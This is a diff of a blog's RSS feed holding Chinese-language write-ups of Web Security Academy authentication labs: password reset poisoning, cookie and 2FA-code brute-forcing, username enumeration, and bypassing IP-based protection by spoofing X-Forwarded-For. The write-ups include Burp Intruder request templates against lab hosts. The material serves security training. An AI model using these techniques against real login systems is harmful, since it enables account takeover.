-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="6">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>通过&lt;code>Go to exploit server -&amp;gt; Access log&lt;/code>查看&lt;code>X-Forwarded-Host&lt;/code>所转发信息
-&lt;img alt="Access log" src="/img/authentication-lab-password-reset-poisoning-via-middleware-4.jpg">&lt;/li>
+&lt;img alt="Access log" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-4.jpg">&lt;/li>
 &lt;li>访问&lt;code>https://0a5800510400298b80f5992500c700e3.web-security-academy.net/forgot-password?temp-forgot-password-token=550690ezc8yqhlyn0k881ch8xhz596mh&lt;/code>
-&lt;img alt="Reset password" src="/img/authentication-lab-password-reset-poisoning-via-middleware-15.jpg">&lt;/li>
+&lt;img alt="Reset password" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-15.jpg">&lt;/li>
 &lt;li>使用重置后的密码登录&lt;code>carlos&lt;/code>
-&lt;img alt="Login" src="/img/authentication-lab-password-reset-poisoning-via-middleware-16.jpg">&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Brute-forcing a stay-logged-in cookie</title><link>/posts/authentication-lab-brute-forcing-a-stay-logged-in-cookie/</link><pubDate>Wed, 04 Dec 2024 21:36:25 +0800</pubDate><guid>/posts/authentication-lab-brute-forcing-a-stay-logged-in-cookie/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-brute-forcing-a-stay-logged-in-cookie-11.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-brute-forcing-a-stay-logged-in-cookie-11.jpg">&lt;/p>
+&lt;img alt="Login" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-16.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Brute-forcing a stay-logged-in cookie</title><link>/posts/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie/</link><pubDate>Wed, 04 Dec 2024 21:36:25 +0800</pubDate><guid>/posts/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-11.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-11.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
 &lt;li>登录时点击&lt;code>Stay logged in&lt;/code>
-&lt;img alt="Stay logged in" src="/img/authentication-lab-brute-forcing-a-stay-logged-in-cookie-12.jpg">&lt;/li>
-&lt;li>登录成功后获得此Request&lt;/li>
-&lt;/ol>
+&lt;img alt="Stay logged in" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-12.jpg">&lt;/li>
+&lt;li>登录成功后获得此Request
 &lt;pre tabindex="0">&lt;code>GET /my-account?id=wiener HTTP/2
 Host: 0af300330343a8dd8221bf1b000600e4.web-security-academy.net
 Cookie: session=ZCYAim6Xl60YARCUtIuqXCMDDHyoxPRs; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
-&lt;/code>&lt;/pre>&lt;ol start="4">
+&lt;/code>&lt;/pre>&lt;/li>
 &lt;li>&lt;code>stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw&lt;/code>当中&lt;code>d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw&lt;/code>对应&lt;code>Base64&lt;/code>解码为&lt;code>wiener:51dc30ddc473d43a6011e9ebba6ca770&lt;/code>，而&lt;code>51dc30ddc473d43a6011e9ebba6ca770&lt;/code>为密码&lt;code>peter&lt;/code>的md5编码&lt;/li>
 &lt;li>根据上述，通过Burp Intruder的Sniper attack构造&lt;code>stay-logged-in&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表
-&lt;img alt="Stay logged in" src="/img/authentication-lab-brute-forcing-a-stay-logged-in-cookie-13.jpg">&lt;/li>
+&lt;img alt="Stay logged in" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-13.jpg">&lt;/li>
 &lt;li>在扫描结果中搜索&lt;code>carlos&lt;/code>，即可得到结果，返回页面后即可解题
-&lt;img alt="Login" src="/img/authentication-lab-brute-forcing-a-stay-logged-in-cookie-14.jpg">
-&lt;img alt="Login" src="/img/authentication-lab-brute-forcing-a-stay-logged-in-cookie-15.jpg">&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA broken logic</title><link>/posts/authentication-lab-2fa-broken-logic/</link><pubDate>Mon, 02 Dec 2024 21:47:59 +0800</pubDate><guid>/posts/authentication-lab-2fa-broken-logic/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-broken-logic-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-broken-logic-1.jpg">&lt;/p>
+&lt;img alt="Login" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-14.jpg">
+&lt;img alt="Login" src="/img/2024/authentication-lab-brute-forcing-a-stay-logged-in-cookie-15.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA broken logic</title><link>/posts/2024/authentication-lab-2fa-broken-logic/</link><pubDate>Mon, 02 Dec 2024 21:47:59 +0800</pubDate><guid>/posts/2024/authentication-lab-2fa-broken-logic/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-broken-logic-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-broken-logic-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
-&lt;li>登录成功(url:&lt;code>/login&lt;/code>)后的Response如下&lt;/li>
-&lt;/ol>
+&lt;li>登录成功(url:&lt;code>/login&lt;/code>)后的Response如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/login2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Set-Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">verify=wiener; HttpOnly&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Set-Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=rId30xi0me3ux2SZjV4aidmumqu92pPv; Secure; HttpOnly; SameSite=None&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
-&lt;li>登录成功后会跳转至&lt;code>/login2&lt;/code>，并且对应的Request为&lt;/li>
-&lt;/ol>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>登录成功后会跳转至&lt;code>/login2&lt;/code>，并且对应的Request为
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /login2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a80005c0389890681083af800d600a9.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=rId30xi0me3ux2SZjV4aidmumqu92pPv; verify=wiener&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
-&lt;li>修改Request的&lt;code>verify&lt;/code>参数为&lt;code>carlos&lt;/code>，并发送Request&lt;/li>
-&lt;/ol>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改Request的&lt;code>verify&lt;/code>参数为&lt;code>carlos&lt;/code>，并发送Request
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /login2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a80005c0389890681083af800d600a9.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=rId30xi0me3ux2SZjV4aidmumqu92pPv; verify=carlos&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
-&lt;li>对应的Response为&lt;/li>
-&lt;/ol>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>对应的Response为
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html; charset=utf-8&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3012&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="6">
-&lt;li>回到页面输入&lt;code>security code&lt;/code>后失败，将对应的Request发送至Intruder，修改&lt;code>verify&lt;/code>为&lt;code>carlos&lt;/code>，参数配置如下&lt;/li>
-&lt;/ol>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到页面输入&lt;code>security code&lt;/code>后失败，将对应的Request发送至Intruder，修改&lt;code>verify&lt;/code>为&lt;code>carlos&lt;/code>，参数配置如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a80005c0389890681083af800d600a9.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=rId30xi0me3ux2SZjV4aidmumqu92pPv; verify=carlos&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mfa-code=§1111§
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img alt="Burp Intruder" src="/img/authentication-lab-2fa-broken-logic-2.jpg">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img alt="Burp Intruder" src="/img/2024/authentication-lab-2fa-broken-logic-2.jpg">
 6. 根据爆破的&lt;code>Length&lt;/code>排列，&lt;code>security code&lt;/code>为&lt;code>0448&lt;/code>，将此结果通过&lt;code>Request in browser -&amp;gt; In original session&lt;/code>返回页面
-&lt;img alt="Burp Intruder result" src="/img/authentication-lab-2fa-broken-logic-3.jpg">
+&lt;img alt="Burp Intruder result" src="/img/2024/authentication-lab-2fa-broken-logic-3.jpg">
 7. 成功登录&lt;code>carlos&lt;/code>
-s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;/p></content></item><item><title>[Write Up]Lab: Username enumeration via account lock</title><link>/posts/authentication-lab-username-enumeration-via-account-lock/</link><pubDate>Sun, 01 Dec 2024 18:44:29 +0800</pubDate><guid>/posts/authentication-lab-username-enumeration-via-account-lock/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-account-lock-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-account-lock-1.jpg">&lt;/p>
+s&lt;img alt="Success" src="/img/2024/authentication-lab-2fa-broken-logic-4.jpg">&lt;/p></content></item><item><title>[Write Up]Lab: Username enumeration via account lock</title><link>/posts/2024/authentication-lab-username-enumeration-via-account-lock/</link><pubDate>Sun, 01 Dec 2024 18:44:29 +0800</pubDate><guid>/posts/2024/authentication-lab-username-enumeration-via-account-lock/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-account-lock-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-account-lock-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
-&lt;li>此题目提到&lt;code>account lock&lt;/code>意思是当&lt;code>用户存在时，多次尝试登录将会被禁止&lt;/code>，通过此特性，使用Burp Intruder的&lt;code>Cluster bomb attack&lt;/code>模式，2个参数分别为&lt;code>username&lt;/code>、以及&lt;code>password&lt;/code>的尾缀，参数1使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表，参数2使用&lt;code>Null payloads&lt;/code>且&lt;code>Generate 5&lt;/code>，其实参数2位置在哪里不重要，只要使参数1的&lt;code>username&lt;/code>作为payload发送5次即可&lt;/li>
-&lt;/ol>
+&lt;li>此题目提到&lt;code>account lock&lt;/code>意思是当&lt;code>用户存在时，多次尝试登录将会被禁止&lt;/code>，通过此特性，使用Burp Intruder的&lt;code>Cluster bomb attack&lt;/code>模式，2个参数分别为&lt;code>username&lt;/code>、以及&lt;code>password&lt;/code>的尾缀，参数1使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表，参数2使用&lt;code>Null payloads&lt;/code>且&lt;code>Generate 5&lt;/code>，其实参数2位置在哪里不重要，只要使参数1的&lt;code>username&lt;/code>作为payload发送5次即可
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">username=§username§&amp;amp;password=password§
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>扫描结果发现&lt;code>username&lt;/code>为&lt;code>academico&lt;/code>时会出现长度为&lt;code>3292&lt;/code>的返回，其内容包含&lt;code>You have made too many incorrect login attempts. Please try again in 1 minute(s).&lt;/code>，因此可以确认&lt;code>academico&lt;/code>是存在的用户
-&lt;img alt="Account lock" src="/img/authentication-lab-username-enumeration-via-account-lock-2.jpg">&lt;/li>
+&lt;img alt="Account lock" src="/img/2024/authentication-lab-username-enumeration-via-account-lock-2.jpg">&lt;/li>
 &lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，通过python实现以下爆破方式
 &lt;ol>
 &lt;li>使用&lt;code>username=academico&amp;amp;password=&amp;lt;password&amp;gt;&lt;/code>进行登录尝试，&lt;code>&amp;lt;password&amp;gt;&lt;/code>使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表进行替换，并判断返回内容包含&lt;code>Your username is&lt;/code>则表示登录成功&lt;/li>
@@ -606,14 +592,14 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;/ol>
 &lt;/li>
 &lt;li>爆破成功后获得密码，使用&lt;code>academico:aaaaaa&lt;/code>登录后即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Broken brute-force protection, IP block</title><link>/posts/authentication-lab-broken-bruteforce-protection-ip-block/</link><pubDate>Sun, 01 Dec 2024 16:51:17 +0800</pubDate><guid>/posts/authentication-lab-broken-bruteforce-protection-ip-block/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-broken-bruteforce-protection-ip-block-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-broken-bruteforce-protection-ip-block-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Broken brute-force protection, IP block</title><link>/posts/2024/authentication-lab-broken-bruteforce-protection-ip-block/</link><pubDate>Sun, 01 Dec 2024 16:51:17 +0800</pubDate><guid>/posts/2024/authentication-lab-broken-bruteforce-protection-ip-block/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-broken-bruteforce-protection-ip-block-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-broken-bruteforce-protection-ip-block-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
 &lt;li>在尝试几次手动登录错误后，会出现以下信息，且新增&lt;code>X-X-Forwarded-For&lt;/code>请求头后仍然会被禁止高频尝试
-&lt;img alt="Brute-force protection" src="/img/authentication-lab-broken-bruteforce-protection-ip-block-2.jpg">&lt;/li>
+&lt;img alt="Brute-force protection" src="/img/2024/authentication-lab-broken-bruteforce-protection-ip-block-2.jpg">&lt;/li>
 &lt;li>可以通过成功登录绕过此策略，所以通过python实现以下爆破方式
 &lt;ol>
 &lt;li>使用&lt;code>username=carlos&amp;amp;password=&amp;lt;password&amp;gt;&lt;/code>进行登录尝试，&lt;code>&amp;lt;password&amp;gt;&lt;/code>使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表进行替换，并判断返回内容包含&lt;code>Your username is&lt;/code>则表示登录成功&lt;/li>
@@ -621,157 +607,149 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;/ol>
 &lt;/li>
 &lt;li>爆破成功后获得密码，使用&lt;code>carlos:austin&lt;/code>登录后即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Authentication Lab Username Enumeration via Response Timing</title><link>/posts/authentication-lab-username-enumeration-via-response-timing/</link><pubDate>Sun, 01 Dec 2024 15:04:12 +0800</pubDate><guid>/posts/authentication-lab-username-enumeration-via-response-timing/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-response-timing-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-response-timing-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Authentication Lab Username Enumeration via Response Timing</title><link>/posts/2024/authentication-lab-username-enumeration-via-response-timing/</link><pubDate>Sun, 01 Dec 2024 15:04:12 +0800</pubDate><guid>/posts/2024/authentication-lab-username-enumeration-via-response-timing/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-response-timing-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-response-timing-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
-&lt;li>根据题目提示需要通过请求返回时间判断用户是否存在，构建枚举用户名请求体时需要在&lt;code>password&lt;/code>参数输入足够长的值；另外题目也提到本地部署了简单的&lt;code>IP-based brute-force protection&lt;/code>，所以需要在请求头新增&lt;code>X-Forwarded-For&lt;/code>用于绕过防御，Burp Intruder使用&lt;code>Battering ram attack&lt;/code>模式，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表+&lt;code>wiener&lt;/code>，请求内容如下&lt;/li>
-&lt;/ol>
+&lt;li>根据题目提示需要通过请求返回时间判断用户是否存在，构建枚举用户名请求体时需要在&lt;code>password&lt;/code>参数输入足够长的值；另外题目也提到本地部署了简单的&lt;code>IP-based brute-force protection&lt;/code>，所以需要在请求头新增&lt;code>X-Forwarded-For&lt;/code>用于绕过防御，Burp Intruder使用&lt;code>Battering ram attack&lt;/code>模式，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表+&lt;code>wiener&lt;/code>，请求内容如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Forwarded-For&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">ip.§ip§&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=§username§&amp;amp;password=wrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpasswordwrongpassword
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>将结果根据&lt;code>Response completed&lt;/code>排序，明显的&lt;code>wiener&lt;/code>、&lt;code>ap&lt;/code>两个用户相关的请求时间高与其他用户的请求，所以可以推断&lt;code>ap&lt;/code>也是存在的用户
-&lt;img alt="Intruder result" src="/img/authentication-lab-username-enumeration-via-response-timing-2.jpg">&lt;/li>
-&lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，继续使用&lt;code>Battering ram attack&lt;/code>模式扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表，请求内容如下&lt;/li>
-&lt;/ol>
+&lt;img alt="Intruder result" src="/img/2024/authentication-lab-username-enumeration-via-response-timing-2.jpg">&lt;/li>
+&lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，继续使用&lt;code>Battering ram attack&lt;/code>模式扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表，请求内容如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Forwarded-For&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">ip.§ip§&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=ap&amp;amp;password=§pwd§
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>在过滤器中将&lt;code>status code 2xx&lt;/code>过滤，即可获得正确的&lt;code>password&lt;/code>为&lt;code>987654321&lt;/code>&lt;/li>
 &lt;li>使用&lt;code>ap:987654321&lt;/code>登录后即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Username enumeration via subtly different responses</title><link>/posts/authentication-lab-username-enumeration-via-subtly-different-responses/</link><pubDate>Sun, 01 Dec 2024 14:40:34 +0800</pubDate><guid>/posts/authentication-lab-username-enumeration-via-subtly-different-responses/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Username enumeration via subtly different responses</title><link>/posts/2024/authentication-lab-username-enumeration-via-subtly-different-responses/</link><pubDate>Sun, 01 Dec 2024 14:40:34 +0800</pubDate><guid>/posts/2024/authentication-lab-username-enumeration-via-subtly-different-responses/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
 &lt;li>尝试随机输入&lt;code>Username&lt;/code>和&lt;code>Password&lt;/code>登录，页面上出现&lt;code>Invalid username or password.&lt;/code>关键字
-&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-2.jpg">&lt;/li>
+&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-2.jpg">&lt;/li>
 &lt;li>使用Burp Intruder对username进行遍历，字典使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表；扫描结束后，使用过滤器中使用&lt;code>Negative search&lt;/code>功能过滤出存在的&lt;code>username&lt;/code>，且其返回内容包含&lt;code>Invalid username or password.&lt;/code>
-&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-3.jpg">&lt;/li>
